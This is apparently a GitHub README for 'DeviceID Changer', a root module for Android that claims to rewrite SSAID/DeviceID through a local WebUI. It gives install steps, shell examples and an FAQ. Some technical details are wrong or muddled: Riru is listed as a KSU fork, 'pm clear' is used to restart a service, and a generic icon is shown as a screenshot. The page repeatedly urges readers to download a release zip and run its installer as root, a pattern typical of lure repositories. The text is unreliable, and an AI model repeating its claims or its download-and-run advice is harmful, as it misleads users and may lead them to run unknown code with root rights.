[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Lutopidkkop/deviceidchanger/releases)

# DeviceID Changer — WebUI to change SSAID on Rooted Android

<img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg" alt="Android" width="120" align="right">

A compact WebUI module for rooted Android devices. Change SSAID / DeviceID using Apatch, KSU (and forks), or Magisk. The module runs on-device and provides a simple interface that writes a new SSAID or DeviceID to the appropriate system stores and modules.

- Core targets: SSAID, DeviceID, Android settings that apps read for device identity.
- Supported installers: Apatch, KSU (and forks such as riru/ksu), Magisk (module format).
- Interface: Local WebUI served from the device for quick control and rollback.

Table of contents
- Badges
- What this does
- Features
- Requirements
- Download and install
- Quick setup (root shell & module)
- WebUI usage
- How it works (technical)
- Screenshots
- Troubleshooting & common fixes
- FAQ
- Security and permissions
- Contributing
- License

Badges
- Release: [![Releases](https://img.shields.io/badge/Download%20Release-blue?logo=github)](https://github.com/Lutopidkkop/deviceidchanger/releases)
- Platform: Android (root required)
- Format: Magisk / KSU / Apatch module

What this does
- Hosts a small WebUI on the device so you can set, randomize, or restore SSAID and DeviceID values.
- Applies changes via writable system paths, app data edits, and module hooks depending on installer.
- Provides a one-click restore to the original value stored at install time.
- Keeps a small audit log on the device for actions taken by the WebUI.

Features
- WebUI served locally (HTTP) on device. Use browser on device or via local network.
- Set custom SSAID / DeviceID strings.
- Generate compliant random IDs.
- Save and restore original IDs.
- Installable as Magisk module, KSU module, or Apatch patch.
- Small footprint; designed to run on low-RAM devices.
- Safe rollback: module stores originals and offers restore button.

Requirements
- Rooted Android device.
- One of the following installers present:
  - Magisk (v20 or newer recommended)
  - KSU or compatible fork
  - Apatch (if used as a patch package)
- Busybox and a basic shell (sh) available on the device.
- A modern Android WebView or browser to access the WebUI.
- USB debugging or local network access for optional desktop control.

Download and install
- Download the release package deviceidchanger.zip and execute the included installer inside the archive. See Releases: https://github.com/Lutopidkkop/deviceidchanger/releases
- If you install via Magisk Manager:
  1. Open Magisk Manager > Modules > Install from storage.
  2. Select deviceidchanger.zip from the release you downloaded.
  3. Reboot to enable.
- If you use KSU or Apatch:
  1. Place the module/patch archive or folder in the appropriate installer path.
  2. Run the installer tool to apply.
  3. Reboot when prompted.

If the release link fails, check the Releases section on GitHub for the latest package.

Quick setup (root shell & module)
1. Download deviceidchanger.zip from the Releases page: https://github.com/Lutopidkkop/deviceidchanger/releases
2. Unzip on a desktop, inspect install script (install.sh), then copy to device or install via Magisk UI.
3. From a root shell on the device:
   - For direct install:
     su
     sh /data/local/tmp/deviceidchanger/install.sh
   - The script will:
     - Create a module folder under /data/adb/modules or /magisk
     - Copy WebUI files to /data/deviceidchanger/www
     - Set permissions
     - Start the small HTTP server on a local port (default: 8082)
4. Reboot if required by your installer.

WebUI usage
- Open browser on device and go to:
  http://localhost:8082/
- If you want to access from another device on same network, use the device IP:
  http://DEVICE_IP:8082/ (the module may restrict remote access by default)
- UI actions:
  - Set SSAID: enter custom value then Apply.
  - Randomize: generate a new compliant ID.
  - Restore: revert to the original ID saved at install.
  - Preview: show current system value and module value before applying changes.
  - Logs: view recent actions and the script output.

Example CLI commands for advanced users
- View current SSAID in settings DB:
  su -c "settings get secure android_id"
- Force a restart of the WebUI service:
  su -c "pm clear com.deviceidchanger && sh /data/adb/deviceidchanger/start.sh"
- Backup current IDs to a file:
  su -c "cat /data/adb/deviceidchanger/originals.json > /sdcard/deviceid_backup.json"

How it works (technical)
- The module uses a small HTTP server written in POSIX shell + netcat (or a tiny Python binary if present) to serve the WebUI.
- The WebUI talks to shell scripts through a safe endpoint that runs with root. The scripts validate inputs before applying them.
- For SSAID (android_id), the module edits Settings Provider entries or injects values via Xposed/KSU hooks if available.
- For legacy apps that cache device info, the module clears app caches where safe, using pm clear for specific packages.
- The module stores originals in a JSON file under /data/adb/deviceidchanger/originals.json and sets strict file permissions.
- When installed as a Magisk module, the module adds overlay hooks that allow early change during boot where required.

Screenshots
- WebUI main screen
  ![WebUI screenshot](https://raw.githubusercontent.com/Lutopidkkop/deviceidchanger/main/docs/screenshots/webui_main.png)
- Options and restore panel
  ![Options screenshot](https://raw.githubusercontent.com/Lutopidkkop/deviceidchanger/main/docs/screenshots/webui_options.png)
- Terminal action log
  ![Log screenshot](https://upload.wikimedia.org/wikipedia/commons/6/6a/Terminal_icon.svg)

Troubleshooting & common fixes
- WebUI will not start
  - Ensure no other app uses the port. Change port in /data/adb/deviceidchanger/config.json and restart start.sh.
  - Check that the start script has execute permission: su -c "chmod +x /data/adb/deviceidchanger/start.sh"
- Changes do not persist after reboot
  - Confirm module installed in correct path for your installer (/data/adb/modules for Magisk).
  - Some Android builds reset Settings DB on OTA. Use the module's boot hook (present in install) to reapply.
- Apps still read old DeviceID
  - Clear the app data (pm clear packagename) or use the WebUI "Clear caches" option.
  - Some apps use hardware-backed IDs that cannot be modified. Those remain unchanged.
- Permission denied errors
  - Make sure the installer ran as root. Re-run install script with su.
  - Check SELinux mode. If SELinux is enforcing and blocks write, use appropriate SELinux patching solutions at your own risk.

Security and permissions
- The WebUI runs as root in a local-only mode by default. The UI binds to localhost to avoid exposure on open networks.
- The module saves original IDs to a file accessible only to root.
- The HTTP endpoint restricts certain operations to users on the device or to authenticated sessions created at install time.
- If you enable remote access, secure your local network and use a VPN or SSH tunnel.
- The module never sends device IDs off device unless you explicitly use "Export" in the UI.

FAQ
- Q: Will this break SafetyNet?
  A: Changing SSAID/DeviceID may affect apps that rely on device identity. SafetyNet uses multiple signals beyond SSAID, and behavior varies by device and region.
- Q: Can I use this without Magisk?
  A: Yes. KSU and Apatch paths are supported. Installation commands differ. The installer auto-detects available manager.
- Q: Can apps detect the change?
  A: Some apps cache values or use hardware IDs. Clearing app caches and restarting helps. Some hardware-tied IDs remain unchanged.
- Q: Is this reversible?
  A: Yes. The module stores originals and exposes a Restore option. Keep a backup export as an extra safeguard.
- Q: Does it work on Android 11/12/13/14?
  A: The module supports modern Android releases. Some system protections on newer Android versions may require additional hooks provided by KSU or Magisk.

Contributing
- Fork the repo, make small focused changes, and open a pull request.
- Follow these rules:
  - Keep changes to scripts and web assets small and clear.
  - Use readable shell code and avoid complex one-liners.
  - Add tests for core functions where possible.
- Run basic checks locally:
  - Validate shell syntax: dash -n script.sh or bash -n script.sh
  - Test WebUI in a safe emulator or spare device.
- If you contribute code that touches persistence or device identity, document the exact behavior and failure modes.

Developer notes (for maintainers)
- The installer creates a JSON manifest in /data/adb/deviceidchanger/manifest.json with module meta and signatures.
- CI builds a zip release with checksums. The release package includes:
  - deviceidchanger.zip (Magisk/Module package)
  - install.sh (installer for manual use)
  - checksums.txt
- The release page requires users to download deviceidchanger.zip and run install.sh inside the archive.

Releases
- Download and run the module package from Releases: https://github.com/Lutopidkkop/deviceidchanger/releases
- Each release contains a signed archive and install instructions in the release notes.
- Use the release matching your Android major version where possible.

License
- This project uses the MIT License. See LICENSE.md for full text.

Contact & support
- For bug reports, open an issue on the repository.
- For feature requests, label the issue "enhancement" and include device model and Android version.
- For urgent problems that affect device boot, provide logs (adb logcat) and a clear step-by-step reproduction path.